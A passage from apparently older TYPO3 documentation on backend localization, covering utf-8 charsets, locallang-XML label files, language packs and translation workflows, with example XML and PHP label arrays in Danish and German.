between developers in the international TYPO3 developer community. So
in fact there are strong reasons for <I>not</I> translating the <I>whole</I>
system into local languages!</P>
<H3 CLASS="western"><A NAME="2.8.2.Character sets|outline"></A>Character
sets</H3>
<P CLASS="western">Currently, local charsets are used <I>by default</I>
inside TYPO3. However it is highly recommended to set
$TYPO3_CONF_VARS['BE']['forceCharset'] = &quot;utf-8&quot; which will
force the backend to run in utf-8 regardless of &quot;native&quot;
charset. Forcing the charset to &quot;utf-8&quot; also means that all
content in the database will be managed in &quot;utf-8&quot; and you
might corrupt existing data if you set it after having added content
in another charset.</P>
<H3 CLASS="western"><A NAME="2.8.3.How translations are handled by the system|outline"></A>
How translations are handled by the system</H3>
<P CLASS="western">Here is the basic facts about TYPO3s technology to
handle localization of the backend interface:</P>
<UL>
	<LI><P CLASS="western"><B>Default language:</B> The default language
	of TYPO3 is English. (Please respect this in extensions as well!)</P>
	<LI><P CLASS="western"><B>Alternative languages:</B> The list of
	available system languages is defined in the constant
	TYPO3_languages (hardcoded/defined in config_default.php). This
	&quot;list&quot; is two-char identification codes representing
	languages. The code usually reflects a ccTLD related to the language
	but can be any unique 2-char combination.</P>
</UL>
<UL>
	<LI><P CLASS="western"><B>Label files:</B> All labels for the
	backend (and frontend) are stored in “locallang-XML” (llXML)
	files located in extensions. They are named according to the scheme
	“locallang*.xml”. The default labels <I>must be english!</I><SPAN STYLE="font-style: normal">
	The system extension “lang” contains labels for the core system.</SPAN></P>
	<UL>
		<LI><P CLASS="western" STYLE="font-style: normal"><I>Notice:</I>
		&quot;locallang*.php&quot; files is an old alternative still
		supported but deprecated; They contain the $LOCAL_LANG array in a
		PHP script which is simply included. Old “locallang.php” files
		can be converted to llXML files using the extension “extdeveval”</P>
	</UL>
	<LI><P CLASS="western"><B>Localization methods:</B> The &quot;language&quot;
	class (from sysext/lang/lang.php) contains methods for requesting
	labels out of llXML files in the backend (such as getLL() and sL()).
	The language class also contains an instance of the class &quot;t3lib_cs&quot;
	where the charsets used for each language are defined. The charset
	is detected by the &quot;template&quot; class and automatically set
	for the documents in the backend.</P>
	<LI><P CLASS="western"><B>Translation of llXML files:</B> On a local
	system this is handled by the extension “llxmltranslate”. Unless
	the llXML files contains inline translation or a specific reference
	to an external file, the “llxmltranslate” tool will write the
	translation to a corresponding filename in “typo3conf/l10n/[language
	key]/[extension key]” (recommended).</P>
	<LI><P CLASS="western"><B>Language packs:</B> Due to the large
	amount of languages for TYPO3 (more than 40) all llXML files in the
	core and extensions should contain <I>only</I> the default english
	labels. If no entry is found in the main file for translations,
	automatically a translation is looked for in
	“typo3conf/l10n/[language key]/[extension key]”. The directory
	“typo3conf/l10n/[language key]/” is called the “language
	pack”.</P>
</UL>
<P CLASS="western">For more detailed information about Frontend
localization in TYPO3, please refer to the document &quot;Frontend
Localization Guide&quot; (doc_l10nguide).</P>
<H3 CLASS="western"><A NAME="2.8.4.Helping translating TYPO3_|outline"></A>
Helping translating TYPO3?</H3>
<P CLASS="western">Regardless of whether you want to help with an
existing language or add a new language you must subscribe to the
“translator” mailing list! That's rule number 1. Start out by
announcing yourself and your intention on that list!</P>
<H3 CLASS="western"><A NAME="2.8.5.Introduce a new language in TYPO3|outline"></A>
Introduce a new language in TYPO3</H3>
<P CLASS="western">If you wish to add a new language to TYPO3, follow
these steps:</P>
<UL>
	<LI><P CLASS="western">First, a 2-char unique language key not yet
	used (Current Language key list: see
	t3lib/stddb/tbl_be.php:be_users:lang) and charset (utf-8 is default)
	must be agreed upon.</P>
	<LI><P CLASS="western">Contact a core developer and ask him to add
	the language key to the core. The steps for doing this is defined
	inside t3lib/config_default.php in a comment just above the
	definition of the constant “TYPO3_languages”.</P>
	<LI><P CLASS="western">As soon as the language is added to the core
	you can start translation using the extension “llxmltranslate”
	running on the new core. The language pack is automatically created
	in “typo3conf/l10n/[new language key]/”</P>
</UL>
<H3 CLASS="western"><A NAME="2.8.6.Translation teamwork_|outline"></A>
Translation teamwork?</H3>
<P CLASS="western">Most likely you would like to translate TYPO3 with
help from other native speakers from the community. These are the
options:</P>
<UL>
	<LI><P CLASS="western"><B>Set up your own translation server: </B>
	</P>
	<UL>
		<LI><P CLASS="western">Install TYPO3 and add those extensions you
		would like to support in you translation</P>
		<LI><P CLASS="western">Install “llxmltranslate” and use the
		backend module “llXML” for translation</P>
		<LI><P CLASS="western">Add user accounts for other translators (set
		their backend language to the language they are supposed to
		translate)</P>
		<LI><P CLASS="western">The result - the language pack in
		“typo3conf/l10n/[language key]/” is ready for distribution.</P>
		<LI><P CLASS="western">Pro: You have maximum freedom to keep the
		translation up-to-date with current core and extensions. You can
		distrubute the language pack as you like.</P>
		<LI><P CLASS="western">Con: You have to intiate the technical set
		up yourself.</P>
	</UL>
	<LI><P CLASS="western"><B>Use official translation server:</B></P>
	<UL>
		<LI><P CLASS="western">Get URL, username and password from
		translator newsgroup.</P>
		<LI><P CLASS="western">If the language is just added you will have
		to wait until Kasper announces that the translation server is
		updated with the new core.</P>
		<LI><P CLASS="western">Pro: Easy solution, don't have to install
		TYPO3 yourself.</P>
		<LI><P CLASS="western">Con: You must accept long times between core
		updates to that server and cannot distrubute your work yourself.</P>
	</UL>
</UL>
<H3 CLASS="western"><A NAME="2.8.7.Distribution of and contribution to language packs|outline"></A>
Distribution of and contribution to language packs</H3>
<P CLASS="western">This is still an open question at this point. The
basic technical nature of a language pack is simply that it is a
directory in typo3conf/l10n/ inside of which locallang-xml files are
found in folders according to the position of their main file. 
</P>
<P CLASS="western">Scheme:
“typo3conf/l10n/[lang]/[extkey]/[dir]+[filename]”</P>
<P CLASS="western">This leaves various possibilities of distribution
and cooperation:</P>
<UL>
	<LI><P CLASS="western"><B>ZIP archives (download)?</B> Language
	packs can be distributed as a zip file contain translations for any
	number of extensions. Installation of a language pack is no harder
	than unzipping a file in the right directory. Groups of extensions
	(like the core) can come bundled together or extensions can be
	packed alone. There is currently no public download place for such
	archives.</P>
	<LI><P CLASS="western"><B>EM support?</B> One could imagine that
	support was built into the Extension Manager: 
	</P>
	<UL>
		<LI><P CLASS="western"><B>Download: </B>EM could traverse all
		installed extensions for locallang*.xml files and send a
		http-request to some repository for possible translations located
		there, then writing them into typo3conf/l10n/. EM could even do
		this transparently based on a configuration of which language packs
		are wanted for the installation.</P>
		<LI><P CLASS="western"><B>Upload:</B> EM could offer to upload
		local translations of extensions to a localization repository. This
		could be the solution for distributed translation of un-common
		extensions since typically one can expect the users of an extension
		to translate it if not already done - and thus, with a click of a
		button they might wish to share it.</P>
	</UL>
	<LI><P CLASS="western"><B>CVS?</B> Putting the whole language pack
	into CVS might be an idea for cooperation on a translation. But
	maybe there will be too many collisions, the language pack in CVS
	will by time contain translations for too many extensions most
	people don't use and it is not likely that all translators have CVS
	knowledge.</P>
	<LI><P CLASS="western"><B>rsync?</B> For both upload and download
	this could pose a lightweight alternative to CVS - especially for
	multiple translation servers. But it suffers many of the problems
	CVS has.</P>
</UL>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western">As a start I would make zip-archives, but my
favourite is to integrate support in EM since:</P>
<UL>
	<LI><P CLASS="western">It's going to be light weight http
	upload/download</P>
	<LI><P CLASS="western">EM knows which extensions are relevant on the
	system and can install language packs for extensions transparently
	as a parallel process to installing extensions.</P>
	<LI><P CLASS="western">Allows easy sharing of translations made all
	over the world (thus an answer to the missing “online translation”
	tool and  translations are made when needed and with understanding
	of what is translated)</P>
</UL>
<P CLASS="western"><BR><BR>
</P>
<H3 CLASS="western"><A NAME="2.8.8.&quot;locallang-XML&quot; (llXML) files|outline"></A>
&quot;locallang-XML&quot; (llXML) files</H3>
<P CLASS="western">The locallang-XML files contain default labels,
possibly inline translations and in addition a lot of meta data used
in the translation tool (extension “llxmltranslate”). 
</P>
<P CLASS="western">Performance is great with the XML files. This is
because the content of the XML file is cached based on the
modification time on the xml file. 
</P>
<P CLASS="western">&quot;locallang-XML&quot; files store the
translations of a single language in external files by default. The
main reason for using external files for locallang-XML should be
distribution considerations:</P>
<UL>
	<LI><P CLASS="western">Typically installations need only English and
	1-2 other backend languages, not all 40+!</P>
	<LI><P CLASS="western">It allows translators to work on translations
	independent of extension authors.</P>
	<LI><P CLASS="western">Splitting translations means we can better
	defend storing meta data for translators.</P>
</UL>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western">The format of locallang-XML files can look like
this example (shows inline translation of danish):</P>
<P CLASS="western"><BR><BR>
</P>
<PRE CLASS="western">&lt;<FONT COLOR="#0000cc">T3locallang</FONT>&gt;
    &lt;<FONT COLOR="#0000cc">meta</FONT> <FONT COLOR="#006600">type</FONT><FONT COLOR="#000000"><B>=&quot;</B></FONT><FONT COLOR="#cc0000">array</FONT><FONT COLOR="#000000"><B>&quot;</B></FONT>&gt;
        &lt;<FONT COLOR="#0000cc">description</FONT>&gt;<FONT COLOR="#cc0000">Standard Module labels for Extension Development Evaluator</FONT>&lt;/<FONT COLOR="#0000cc">description</FONT>&gt;
        &lt;<FONT COLOR="#0000cc">type</FONT>&gt;<FONT COLOR="#cc0000">module</FONT>&lt;/<FONT COLOR="#0000cc">type</FONT>&gt;
        &lt;<FONT COLOR="#0000cc">csh_table</FONT>/&gt;
        &lt;<FONT COLOR="#0000cc">labelContext</FONT> <FONT COLOR="#006600">type</FONT><FONT COLOR="#000000"><B>=&quot;</B></FONT><FONT COLOR="#cc0000">array</FONT><FONT COLOR="#000000"><B>&quot;</B></FONT>/&gt;
    &lt;/<FONT COLOR="#0000cc">meta</FONT>&gt;
    &lt;<FONT COLOR="#0000cc">data</FONT> <FONT COLOR="#006600">type</FONT><FONT COLOR="#000000"><B>=&quot;</B></FONT><FONT COLOR="#cc0000">array</FONT><FONT COLOR="#000000"><B>&quot;</B></FONT>&gt;
        &lt;<FONT COLOR="#0000cc">languageKey</FONT> <FONT COLOR="#006600">index</FONT><FONT COLOR="#000000"><B>=&quot;</B></FONT><FONT COLOR="#cc0000">default</FONT><FONT COLOR="#000000"><B>&quot;</B></FONT> <FONT COLOR="#006600">type</FONT><FONT COLOR="#000000"><B>=&quot;</B></FONT><FONT COLOR="#cc0000">array</FONT><FONT COLOR="#000000"><B>&quot;</B></FONT>&gt;
            &lt;<FONT COLOR="#0000cc">label</FONT> <FONT COLOR="#006600">index</FONT><FONT COLOR="#000000"><B>=&quot;</B></FONT><FONT COLOR="#cc0000">mlang_tabs_tab</FONT><FONT COLOR="#000000"><B>&quot;</B></FONT>&gt;<FONT COLOR="#cc0000">ExtDevEval</FONT>&lt;/<FONT COLOR="#0000cc">label</FONT>&gt;
            &lt;<FONT COLOR="#0000cc">label</FONT> <FONT COLOR="#006600">index</FONT><FONT COLOR="#000000"><B>=&quot;</B></FONT><FONT COLOR="#cc0000">mlang_labels_tabdescr</FONT><FONT COLOR="#000000"><B>&quot;</B></FONT>&gt;<FONT COLOR="#cc0000">The Extension Development Evaluator tool.</FONT>&lt;/<FONT COLOR="#0000cc">label</FONT>&gt;
        &lt;/<FONT COLOR="#0000cc">languageKey</FONT>&gt;
        &lt;<FONT COLOR="#0000cc">languageKey</FONT> <FONT COLOR="#006600">index</FONT><FONT COLOR="#000000"><B>=&quot;</B></FONT><FONT COLOR="#cc0000">dk</FONT><FONT COLOR="#000000"><B>&quot;</B></FONT> <FONT COLOR="#006600">type</FONT><FONT COLOR="#000000"><B>=&quot;</B></FONT><FONT COLOR="#cc0000">array</FONT><FONT COLOR="#000000"><B>&quot;</B></FONT>&gt;
            &lt;<FONT COLOR="#0000cc">label</FONT> <FONT COLOR="#006600">index</FONT><FONT COLOR="#000000"><B>=&quot;</B></FONT><FONT COLOR="#cc0000">mlang_tabs_tab</FONT><FONT COLOR="#000000"><B>&quot;</B></FONT>&gt;<FONT COLOR="#cc0000">ExtDevEval</FONT>&lt;/<FONT COLOR="#0000cc">label</FONT>&gt;
            &lt;<FONT COLOR="#0000cc">label</FONT> <FONT COLOR="#006600">index</FONT><FONT COLOR="#000000"><B>=&quot;</B></FONT><FONT COLOR="#cc0000">mlang_labels_tabdescr</FONT><FONT COLOR="#000000"><B>&quot;</B></FONT>&gt;<FONT COLOR="#cc0000">Evalueringsværktøj til udvikling af extensions.</FONT>&lt;/<FONT COLOR="#0000cc">label</FONT>&gt;
        &lt;/<FONT COLOR="#0000cc">languageKey</FONT>&gt;<BR>....<BR>    &lt;/<FONT COLOR="#0000cc">data</FONT>&gt;<BR>    &lt;<FONT COLOR="#0000cc">orig_hash</FONT> <FONT COLOR="#006600">type</FONT><FONT COLOR="#000000"><B>=&quot;</B></FONT><FONT COLOR="#cc0000">array</FONT><FONT COLOR="#000000"><B>&quot;</B></FONT>&gt;
        &lt;<FONT COLOR="#0000cc">languageKey</FONT> <FONT COLOR="#006600">index</FONT><FONT COLOR="#000000"><B>=&quot;</B></FONT><FONT COLOR="#cc0000">dk</FONT><FONT COLOR="#000000"><B>&quot;</B></FONT> <FONT COLOR="#006600">type</FONT><FONT COLOR="#000000"><B>=&quot;</B></FONT><FONT COLOR="#cc0000">array</FONT><FONT COLOR="#000000"><B>&quot;</B></FONT>&gt;
            &lt;<FONT COLOR="#0000cc">label</FONT> <FONT COLOR="#006600">index</FONT><FONT COLOR="#000000"><B>=&quot;</B></FONT><FONT COLOR="#cc0000">mlang_tabs_tab</FONT><FONT COLOR="#000000"><B>&quot;</B></FONT> <FONT COLOR="#006600">type</FONT><FONT COLOR="#000000"><B>=&quot;</B></FONT><FONT COLOR="#cc0000">integer</FONT><FONT COLOR="#000000"><B>&quot;</B></FONT>&gt;<FONT COLOR="#cc0000">114927868</FONT>&lt;/<FONT COLOR="#0000cc">label</FONT>&gt;
            &lt;<FONT COLOR="#0000cc">label</FONT> <FONT COLOR="#006600">index</FONT><FONT COLOR="#000000"><B>=&quot;</B></FONT><FONT COLOR="#cc0000">mlang_labels_tabdescr</FONT><FONT COLOR="#000000"><B>&quot;</B></FONT> <FONT COLOR="#006600">type</FONT><FONT COLOR="#000000"><B>=&quot;</B></FONT><FONT COLOR="#cc0000">integer</FONT><FONT COLOR="#000000"><B>&quot;</B></FONT>&gt;<FONT COLOR="#cc0000">187879914</FONT>&lt;/<FONT COLOR="#0000cc">label</FONT>&gt;
        &lt;/<FONT COLOR="#0000cc">languageKey</FONT>&gt;<BR>    &lt;/<FONT COLOR="#0000cc">orig_hash</FONT>&gt;<BR>&lt;/<FONT COLOR="#0000cc">T3locallang</FONT>&gt;</PRE><P CLASS="western">
You can refer to <A HREF="#%3CT3locallang%3E%7Coutline">&quot;TYPO3
Core API&quot; for details about the XML format</A>.</P>
<H4 CLASS="western">Converting to llXML from locallang.php</H4>
<P CLASS="western">If you have locallang.php files in your
extensions, please consider to convert them to llXML. This can be
done with the extension “extdeveval” which contains a tool for
that. After conversion there is another tool which will separate
translations out into the language pack directories. This is of
course also highly recommended so the remaining main llXML file
contains only default labels!</P>
<H3 CLASS="western"><A NAME="2.8.9.&quot;locallang.php&quot; files (deprecated)|outline"></A>
&quot;locallang.php&quot; files (deprecated)</H3>
<P CLASS="western"> 
</P>
<P CLASS="western">A &quot;locallang&quot; file looks like this
(sysext/lang/locallang_tca.php):</P>
<PRE CLASS="western"><CODE CLASS="western"><FONT COLOR="#0000bb">&lt;?php<BR><BR>$LOCAL_LANG </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">= Array (<BR>&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'default' </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; Array (<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'pages' </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'Page'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'doktype.I.0' </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'Standard'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'doktype.I.1' </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'SysFolder'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'doktype.I.2' </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'Recycler'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'title' </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'Pagetitle:'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'php_tree_stop' </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'Stop page tree:'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'is_siteroot' </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'Is root of website:'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'storage_pid' </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'General Record Storage page:'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'be_users' </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'Backend user'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'be_groups' </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'Backend usergroup'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'sys_filemounts' </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'Filemount'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;),<BR>&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'dk' </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; Array (<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'pages' </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'Side'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'doktype.I.0' </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'Standard'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'doktype.I.1' </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'SysFolder'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'doktype.I.2' </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'Papirkurv'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'title' </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'Sidetitel:'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'php_tree_stop' </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'Stop sidetræ:'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'is_siteroot' </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'Siden er websitets rod:'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'storage_pid' </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'Generel elementlager-side:'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'be_users' </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'Opdaterings bruger'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'be_groups' </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'Opdaterings brugergruppe'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'sys_filemounts' </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'Filmount'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;),<BR>&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'de' </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; Array (<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'pages' </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'Seite'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'doktype.I.0' </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'Standard'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'doktype.I.1' </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'SysOrdner'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'doktype.I.2' </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'Papierkorb'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'title' </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'Seitentitel:'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'php_tree_stop' </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'Seitenbaum stoppen:'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'is_siteroot' </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'Ist Anfang der Webseite:'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'storage_pid' </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'Allgemeine Datensatzsammlung:'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'be_users' </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'Backend Benutzer'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'be_groups' </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'Backend Benutzergruppe'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'sys_filemounts' </FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt; </FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'Dateifreigaben'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;),<BR></FONT></CODE>
<CODE CLASS="western"><FONT COLOR="#007700">....[lots of other languages defined]...</FONT></CODE>

